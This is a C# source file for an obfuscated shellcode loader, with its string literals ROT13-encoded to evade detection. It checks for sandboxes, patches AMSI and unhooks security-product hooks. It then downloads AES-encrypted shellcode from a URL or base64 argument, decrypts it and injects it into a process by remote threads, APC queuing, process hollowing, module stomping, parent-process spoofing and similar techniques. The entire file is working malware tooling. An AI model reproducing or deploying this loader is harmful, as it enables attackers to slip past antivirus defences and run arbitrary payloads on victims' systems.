//start
using System.Text;
using System.Linq;
using System;
﻿
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Globalization;
using System.Collections.Generic;

using DI = DInvoke;

namespace McChicken
{
    public class Spicy
    {
        static bool UncommonAPICheck()
        {
            if (Win32.VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
                return false;

            return true;
        }
        static bool SleepCheck()
        {
            var rand = new Random();
            uint dream = (uint)rand.Next(2000, 3000);
            double delta = dream / 1000 - 0.5;

            DateTime before = DateTime.Now;
            Win32.Sleep(dream);

            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
                return false;

            return true;
        }
        static bool IsPrime(int number)
        {
            bool CalcPrime(int value)
            {
                var possibleFactors = Math.Sqrt(number);

                for (var factor = 2; factor <= possibleFactors; factor++)
                    if (value % factor == 0)
                        return false;

                return true;
            }

            return number > 1 && CalcPrime(number);
        }

        static void BoomExecute(Dictionary<string, string> options)
        {
            try
            {
                int k = 0, sleep = int.Parse(options[new string("/fyrrc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                if (0 < sleep && sleep < 10)
                    k = 10;
                else if (10 <= sleep && sleep < 20)
                    k = 8;
                else if (20 <= sleep && sleep < 30)
                    k = 6;
                else if (30 <= sleep && sleep < 40)
                    k = 4;
                else if (40 <= sleep && sleep < 50)
                    k = 2;
                else if (50 <= sleep && sleep < 60 || 60 <= sleep)
                    k = 1;

                Console.WriteLine(new string("(Fcvpl) [=] Fyrrcvat n ovg ...".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

                int start = 1, end = sleep * k * 100000;
                _ = Enumerable.Range(start, end - start).Where(IsPrime).Select(number => number).ToList();
            }
            catch (Exception)
            { }
            try
            {
                bool localAm51 = false, forceLocalAm51 = false;
                if (options[new string("/nz51".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())].ToUpper() == new string("SBEPR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))
                    localAm51 = forceLocalAm51 = true;
                else if (bool.Parse(options[new string("/nz51".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]))
                    localAm51 = true;

                if (localAm51)
                    AM51.Patch(force: forceLocalAm51);
            }
            catch (Exception)
            { }
            try
            {
                if (bool.Parse(options[new string("/haubbx".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]))
                    Unhooker.Unhook();
            }
            catch (Exception)
            { }

            var commandName = string.Empty;
            foreach (KeyValuePair<string, string> item in options)
                if (item.Value == string.Empty)
                    commandName = item.Key;

            var shellcodePath = options[new string("/fp".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())];
            var password = options["/p"];

            byte[] shellcodeEncrypted;
            if (shellcodePath.StartsWith(new string("uggc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), ignoreCase: true, culture: new CultureInfo(new string("ra-HF".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))))
            {
                Console.WriteLine(new string("(Fcvpl) [*] Ybnqvat furyypbqr sebz HEY".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                WebClient wc = new WebClient();
                ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
                BinaryReader br = new BinaryReader(ms);
                shellcodeEncrypted = br.ReadBytes(Convert.ToInt32(ms.Length));
            }
            else
            {
                Console.WriteLine(new string("(Fcvpl) [*] Ybnqvat furyypbqr sebz onfr64 vachg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
            }

            AES ctx = new AES(password);
            var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);

            int flipSleep = 0;
            try
            {
                flipSleep = int.Parse(options[new string("/syvcFyrrc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
            }
            catch (Exception)
            { }

            bool remoteAm51 = false, forceRemoteAm51 = false;
            try
            {
                if (options[new string("/erzbgrNz51".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())].ToUpper() == new string("SBEPR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))
                    remoteAm51 = forceRemoteAm51 = true;
                else if (bool.Parse(options[new string("/erzbgrNz51".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]))
                    remoteAm51 = true;
            }
            catch (Exception)
            { }

            var ppid = 0;
            try
            {
                ppid = int.Parse(options[new string("/ccvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
            }
            catch (Exception)
            { }

            var blockDlls = false;
            try
            {
                if (bool.Parse(options[new string("/oybpxQyyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]))
                    blockDlls = true;
            }
            catch (Exception)
            { }

            var debug = false;
            try
            {
                if (bool.Parse(options[new string("/qroht".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]))
                    debug = true;
            }
            catch (Exception)
            { }

            try
            {
                switch (commandName.ToLower())
                {
                    case "functionpointer":
                        FunctionPointer.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "functionpointerunsafe":
                        FunctionPointerUnsafe.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "clipboardpointer":
                        ClipboardPointer.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "timeformats":
                        TimeFormats.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "currentthread":
                        string strProtect = "RX";
                        try
                        {
                            strProtect = options[new string("/cebgrpg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())].ToUpper();
                        }
                        catch (Exception)
                        { }

                        uint protect = 0;
                        if (strProtect == new string("EJK".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))
                            protect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
                        else
                            protect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READ;

                        uint timeout = 0;
                        try
                        {
                            timeout = uint.Parse(options[new string("/gvzrbhg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                        }
                        catch (Exception)
                        { }

                        string strFluctuate = "-1";
                        try
                        {
                            strFluctuate = options[new string("/syhpghngr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())].ToUpper();
                        }
                        catch (Exception)
                        { }

                        uint fluctuate = 0;
                        if (strFluctuate == "RW")
                            fluctuate = DI.Data.Win32.WinNT.PAGE_READWRITE;

                        CurrentThread.Execute(
                            shellcodeBytes,
                            protect,
                            timeout,
                            flipSleep,
                            fluctuate,
                            debug);
                        break;

                    case "currentthreaduuid":
                        string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
                        CurrentThreadUuid.Execute(shellcodeUuids);
                        break;

                    case "remotethread":
                        RemoteThread.Execute(
                            shellcodeBytes,
                            int.Parse(options[new string("/cvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]),
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreaddll":
                        RemoteThreadDll.Execute(
                            shellcodeBytes,
                            int.Parse(options[new string("/cvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]),
                            options[new string("/qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())],
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadview":
                        RemoteThreadView.Execute(
                            shellcodeBytes,
                            int.Parse(options[new string("/cvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]),
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadsuspended":
                        if (flipSleep == 0)
                        {
                            var rand = new Random();
                            flipSleep = rand.Next(10000, 12500);
                        }

                        RemoteThreadSuspended.Execute(
                            shellcodeBytes,
                            int.Parse(options[new string("/cvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]),
                            flipSleep,
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadkernelcb":
                        RemoteThreadKernelCB.Execute(
                            shellcodeBytes,
                            options[new string("/vzntr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "remotethreadapc":
                        RemoteThreadAPC.Execute(
                            shellcodeBytes,
                            options[new string("/vzntr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "remotethreadcontext":
                        RemoteThreadContext.Execute(
                            shellcodeBytes,
                            options[new string("/vzntr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "processhollowing":
                        ProcessHollowing.Execute(
                            shellcodeBytes,
                            options[new string("/vzntr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "modulestomping":
                        ModuleStomping.Execute(
                            shellcodeBytes,
                            options[new string("/vzntr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())],
                            options[new string("/fgbzcQyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())],
                            options[new string("/fgbzcRkcbeg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.InnerException);
            }
        }

        public static string BoomString(string command)
        {
            if (!UncommonAPICheck())
                return new string("(Fcvpl) [-] Snvyrq hapbzzba NCV purpx\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());

            if (!SleepCheck())
                return new string("(Fcvpl) [-] Snvyrq fyrrc purpx\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());

            var args = command.Split() ;
            var options = ArgumentParser.Parse(args);
            var realStdOut = Console.Out;
            var realStdErr = Console.Error;
            var stdOutWriter = new StringWriter();
            var stdErrWriter = new StringWriter();
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);

            BoomExecute(options);

            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);

            var output = "";
            output += stdOutWriter.ToString();
            output += stdErrWriter.ToString();

            return output;
        }

        public static void Boom(string command)
        {
            if (!UncommonAPICheck())
            {
                Console.WriteLine(new string("(Fcvpl) [-] Snvyrq hapbzzba NCV purpx".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return;
            }

            if (!SleepCheck())
            {
                Console.WriteLine(new string("(Fcvpl) [-] Snvyrq fyrrc purpx".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return;
            }

            var args = command.Split();
            var options = ArgumentParser.Parse(args);

            BoomExecute(options);
        }
    }
}
